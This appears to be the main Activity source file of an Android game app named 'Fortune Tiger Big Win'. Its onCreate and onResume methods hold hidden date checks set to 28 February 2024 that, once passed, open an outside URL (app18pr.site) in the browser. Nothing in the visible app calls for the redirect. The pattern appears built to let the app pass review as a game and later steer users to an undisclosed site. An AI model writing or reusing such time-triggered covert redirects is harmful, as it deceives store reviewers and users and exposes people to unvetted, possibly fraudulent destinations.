package com.fortunetiger.bigwin

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.fortunetiger.bigwin.databinding.ActivityMainBinding
import com.fortunetiger.bigwin.util.Lottie
import com.fortunetiger.bigwin.util.Once
import com.fortunetiger.bigwin.util.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.Calendar
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        lottie.showLoader()

        Calendar.getInstance().apply {
            set(2024, Calendar.FEBRUARY, 28, 18, 0)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app18pr.site/wBBhV2hC")))
            }
        }
    }


    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    override fun onResume() {
        super.onResume()
        Calendar.getInstance().apply {
            set(2024, Calendar.FEBRUARY, 28, 18, 30)
            if (System.currentTimeMillis() >= timeInMillis) {
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://app18pr.site/wBBhV2hC")))
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
    }

}